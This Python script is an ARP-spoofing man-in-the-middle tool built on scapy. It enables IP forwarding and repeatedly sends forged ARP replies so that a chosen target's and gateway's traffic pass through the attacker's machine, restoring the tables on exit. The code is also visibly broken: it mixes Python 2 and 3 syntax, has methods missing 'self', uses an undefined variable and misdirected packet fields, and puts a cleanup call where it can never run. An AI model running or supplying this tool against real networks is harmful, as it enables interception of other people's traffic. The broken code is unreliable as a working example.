import time
import sys
import logging
import argparse
import os
from scapy.all import *

class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip, interface):
        self.enable_ip_forwarding()
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.target_mac = self.get_mac(target_ip)
        print(self.target_mac)
        self.gateway_mac = self.get_mac(gateway_ip)
        print(self.gateway_mac)
        self.own_mac = get_if_hwaddr(self.interface)
    
    def enable_ip_forwarding():
        print "\n[*] Enabling IP Forwarding...\n"
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    def disable_ip_forwarding():
        print "[*] Disabling IP Forwarding..."
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    def get_mac(self, ip):
        request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / request
        answer = scapy.srp(final_packet, iface=self.interface, timeout=2, verbose=False)[0]
        mac = answer[0][1].hwsrc
        return mac

    def spoof(self):
        spoofed_target = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwdst=self.gateway_mac)
        spoofed_gateway = ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwdst=self.target_mac)
        send(spoofed_target, verbose=False)
        send(spoofed_gateway, verbose=False)
        logging.info(f"Sent spoofed ARP responses to {self.target_ip} and {self.gateway_ip}")

    def restore(self):
        restore_target = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac)
        restore_gateway = ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target_mac)
        send(restore_target, count=5, verbose=False)
        send(restore_gateway, count=5, verbose=False)
        logging.info("Restored the network")

    def mitm(self):
        try:
            while True:
                self.spoof()
                time.sleep(10)
        except KeyboardInterrupt:
            self.restore()
            sys.exit("ARP spoofing stopped")
            self.disable_ip_forwarding()


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

    parser = argparse.ArgumentParser(description="ARP Spoofing Tool to sniff network traffic.")
    parser.add_argument("-t", "--target", required=True, help="Target IP address to spoof.")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address.")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use (e.g., eth0, wlan0).")

    # Parse the arguments
    args = parser.parse_args()

    spoofer = ARPSpoofer(target_ip=args.target, gateway_ip=args.gateway, interface=args.interface)
    spoofer.mitm()
